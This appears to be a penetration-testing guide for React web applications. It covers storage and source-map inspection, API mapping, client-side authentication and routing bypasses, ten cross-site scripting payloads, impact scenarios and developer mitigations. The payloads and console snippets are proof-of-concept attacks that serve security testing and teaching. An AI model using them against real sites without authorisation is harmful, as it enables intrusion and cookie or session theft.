## 1. Overview

React is a JavaScript library for building user interfaces. While React itself has security features, misconfigurations and improper implementations can introduce vulnerabilities in applications built with it. This guide focuses on testing React applications for security weaknesses through client-side analysis, storage inspection, and common attack vectors.

**Key Security Concepts:**

- React applications run client-side, making all JavaScript code accessible for analysis
- State management and data flow can expose sensitive information
- Developers often leave debugging artifacts and configuration data in production builds
- Client-side routing and API endpoints are fully visible in the browser

---

## 2. Exploitation Methods

### Step 1: Initial Reconnaissance

**Check Browser DevTools Storage:**

```
1. Open Chrome DevTools (F12)
2. Navigate to Application tab
3. Inspect all storage mechanisms:
   - Local Storage
   - Session Storage
   - Cookies
   - IndexedDB
   - Cache Storage
```

**What to Look For:**

- Authentication tokens (JWT, session IDs)
- API keys and secrets
- User data and PII
- Configuration parameters
- Feature flags
- Debug mode indicators

**Action Items:**

- [ ] Document all stored key-value pairs
- [ ] Identify sensitive data in storage
- [ ] Test manual modification of values
- [ ] Observe application behavior after changes

---

### Step 2: JavaScript Source Analysis

**Locate React Application Files:**

```
Chrome DevTools → Sources tab → Look for:
- /static/js/main.[hash].js
- /static/js/[number].[hash].chunk.js
- /bundle.js
- /app.js
```

**Search for Sensitive Endpoints:**

```javascript
// In Sources tab, use Search (Ctrl+Shift+F) for:
- "api/"
- "endpoint"
- "/v1/"
- "/admin"
- "token"
- "secret"
- "password"
- "Authorization"
- "Bearer"
```

**Pro Tip:** Use the global search across all loaded scripts to find hardcoded credentials, API paths, and internal endpoints.

---

### Step 3: Source Map Analysis

**What Are Source Maps?** Source maps (`.map` files) help developers debug minified production code by mapping it back to original source. They often contain:

- Original variable names
- Comments with sensitive info
- Full source code structure
- Internal logic and business rules

**How to Access:**

```
1. Find the main JavaScript file URL
   Example: https://target.com/static/js/main.a1b2c3.js

2. Append .map to the filename
   Example: https://target.com/static/js/main.a1b2c3.js.map

3. Access directly in browser or download for offline analysis
```

**Automated Check:**

```bash
# Check if source maps are exposed
curl -I https://target.com/static/js/main.[hash].js.map
```

**What to Extract:**

- Unminified source code
- Developer comments
- Internal function names
- Hidden features and admin routes
- Business logic vulnerabilities

---

### Step 4: API Endpoint Mapping

**Systematic Approach:**

```
1. Extract all HTTP requests from Network tab
2. Document API structure and patterns
3. Identify authentication mechanisms
4. Test authorization boundaries
5. Map CRUD operations for each endpoint
```

**Common React API Patterns:**

```javascript
// RESTful patterns
/api/users
/api/users/:id
/api/admin/dashboard

// GraphQL
/graphql
/api/graphql

// WebSocket connections
ws://target.com/socket
```

**Testing Checklist:**

- [ ] Test each endpoint without authentication
- [ ] Modify user IDs (IDOR testing)
- [ ] Try higher-privileged endpoints
- [ ] Check for rate limiting
- [ ] Validate input sanitization

---

### Step 5: React-Specific Testing

**Component Props Manipulation:** React components receive data through props. In DevTools:

```
1. Install React Developer Tools extension
2. Inspect component hierarchy
3. Modify props in real-time
4. Observe application behavior
```

**State Management Analysis:**

```javascript
// Redux DevTools shows full application state
// Look for:
- User permissions and roles
- Cached sensitive data
- Authentication state
- Hidden UI features
```

**Client-Side Routing Exploitation:**

```javascript
// React Router paths often defined in code
// Search for:
<Route path="/admin" />
<Route path="/secret" />
<PrivateRoute path="/hidden" />

// Try accessing these routes directly
```

---

## 3. Bypasses

### Authentication Bypass Techniques

**Client-Side Auth Bypass:**

```javascript
// If authentication is only client-side:
1. Locate auth check in code
2. Modify localStorage tokens
3. Set isAuthenticated = true in React state
4. Use DevTools to manually trigger protected routes
```

**Example Manipulation:**

```javascript
// In Console
localStorage.setItem('isAdmin', 'true');
localStorage.setItem('userRole', 'administrator');
location.reload();
```

---

### React Router Protection Bypass

**Scenario:** Protected routes checked only on frontend

```javascript
// Weak implementation
<PrivateRoute path="/admin" component={AdminPanel} />

// Bypass method
// Navigate directly to route in URL bar
https://target.com/admin
```

**Testing Strategy:**

- [ ] List all routes from source code
- [ ] Access each route directly
- [ ] Check if API calls succeed without UI access
- [ ] Test with modified localStorage/sessionStorage

---

### Development Mode Detection Bypass

**Check for Debug Modes:**

```javascript
// Search source for:
NODE_ENV === 'development'
DEBUG === true
__DEV__

// Try enabling in Console:
localStorage.setItem('debug', 'true');
localStorage.setItem('NODE_ENV', 'development');
```

---

## 4. Payloads

### XSS in React Applications

**1. Dangerously Set HTML:**

```jsx
// Vulnerable pattern
<div dangerouslySetInnerHTML={{__html: userInput}} />

// Payload
<img src=x onerror=alert(document.cookie)>
```

**2. href JavaScript Protocol:**

```jsx
// Payload
<a href="javascript:alert(document.domain)">Click</a>
```

**3. React Props Injection:**

```jsx
// If props are user-controlled
payload = {dangerouslySetInnerHTML: {__html: '<img src=x onerror=alert(1)>'}}
```

**4. SVG XSS:**

```html
<svg onload=alert(document.cookie)>
```

**5. Event Handler Injection:**

```jsx
// If event handlers accept user input
onClick="alert(document.domain)"
```

**6. Template Injection:**

```javascript
// In older React or misconfigurations
${alert(document.cookie)}
```

**7. JSON Injection:**

```json
{"name": "</script><script>alert(1)</script>"}
```

**8. Unicode Bypass:**

```javascript
\u003cscript\u003ealert(1)\u003c/script\u003e
```

**9. HTML Entity Bypass:**

```html
&lt;img src=x onerror=alert(1)&gt;
```

**10. CSS Injection:**

```jsx
// If inline styles accept user input
<div style={{background: "url('javascript:alert(1)')"}} />
```

---

## 5. Higher Impact Scenarios

### Scenario 1: Exposed Admin Routes

**Discovery:**

```javascript
// Found in source: /admin/users/delete
// No server-side authorization check
```

**Impact:** Full user account takeover, data deletion

**Exploitation:**

```
1. Navigate to hidden admin route
2. Capture API calls for admin functions
3. Replay requests as low-privileged user
4. Achieve privilege escalation
```

---

### Scenario 2: Hardcoded API Keys

**Discovery:**

```javascript
// In JavaScript bundle
const API_KEY = "sk_live_abc123xyz789";
const AWS_SECRET = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY";
```

**Impact:** Full compromise of third-party services, data exfiltration

**Exploitation:**

```
1. Extract keys from source
2. Test key validity
3. Enumerate accessible resources
4. Exfiltrate or modify data
```

---

### Scenario 3: Source Map Exposure

**Discovery:**

```
Access to .map files reveals:
- Complete original source code
- Business logic
- Hidden admin features
- Commented-out sensitive code
```

**Impact:** Full application logic disclosure, easier vulnerability discovery

**Exploitation:**

```
1. Download all .map files
2. Reconstruct original codebase
3. Perform thorough code review
4. Identify logic flaws and hidden features
```

---

### Scenario 4: Insecure State Management

**Discovery:**

```javascript
// Redux state contains sensitive data
{
  user: {
    id: 123,
    role: "user",
    permissions: ["read"],
    jwt: "eyJhbGc..."
  }
}
```

**Impact:** Token theft, privilege escalation

**Exploitation:**

```
1. Use Redux DevTools to view full state
2. Modify role to "admin"
3. Change permissions array
4. Access privileged functions
```

---

### Scenario 5: Client-Side Access Control

**Discovery:**

```javascript
// Authorization checked only in React code
if (user.role === 'admin') {
  return <AdminPanel />;
}
```

**Impact:** Full admin access through client manipulation

**Exploitation:**

```javascript
// In Console
window.__REACT_DEVTOOLS_GLOBAL_HOOK__.renderers.forEach(r => {
  r.findFiberByHostInstance = () => ({role: 'admin'});
});
```

---

## 6. Mitigations

### For Developers

**Secure Storage Practices:**

```javascript
// ❌ Never store sensitive data in localStorage
localStorage.setItem('jwt', token);

// ✅ Use httpOnly cookies for tokens
// Set on server-side, inaccessible to JavaScript
```

---

**Disable Source Maps in Production:**

```javascript
// webpack.config.js
module.exports = {
  devtool: false, // Disable source maps
  // OR
  devtool: 'source-map', // Generate maps but don't deploy them
};
```

---

**Server-Side Authorization:**

```javascript
// ❌ Client-side only check
if (user.role === 'admin') showAdminPanel();

// ✅ Verify on every API call
app.get('/api/admin/users', verifyAdminRole, (req, res) => {
  // Server validates user role
});
```

---

**Sanitize User Input:**

```jsx
// ✅ React auto-escapes by default
<div>{userInput}</div>

// ❌ Dangerous HTML insertion
<div dangerouslySetInnerHTML={{__html: userInput}} />

// ✅ If HTML needed, use DOMPurify
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(userInput)}} />
```

---

**Environment Variable Security:**

```javascript
// ❌ Exposed in client bundle
const API_KEY = "secret123";

// ✅ Use environment variables (still visible client-side)
const PUBLIC_API_KEY = process.env.REACT_APP_PUBLIC_KEY;

// ✅ Best: Never put secrets in client code
// All sensitive operations on backend
```

---

**Content Security Policy:**

```html
<!-- Add CSP headers -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">
```

---

### For Security Testers

**Systematic Testing Workflow:**

```
1. Map all client-side assets
2. Extract and analyze source maps
3. Document all API endpoints
4. Test storage manipulation
5. Verify server-side authorization
6. Test for XSS in all input fields
7. Check for sensitive data exposure
8. Test hidden routes and features
9. Validate authentication mechanisms
10. Document findings with PoC
```

---

**Automated Tools:**

- **Burp Suite** - Intercept and modify React API calls
- **OWASP ZAP** - Automated scanning
- **React DevTools** - Component and state inspection
- **Redux DevTools** - State management analysis
- **Postman** - API endpoint testing
- **LinkFinder** - Extract endpoints from JS files

---

**Pro Tips:**

- 🎯 Start with low-hanging fruit: storage, source maps, hardcoded secrets
- 🚀 React apps expose everything client-side - use this to your advantage
- 🔍 Always check for `.map` files - they're a goldmine
- 💪 Server-side validation is what matters - client checks are just UX
- ⚡ Build a methodology and stick to it for consistency

---

**Remember:** Every React app is different, but the methodology stays the same. Stay systematic, document everything, and celebrate each finding! 🎉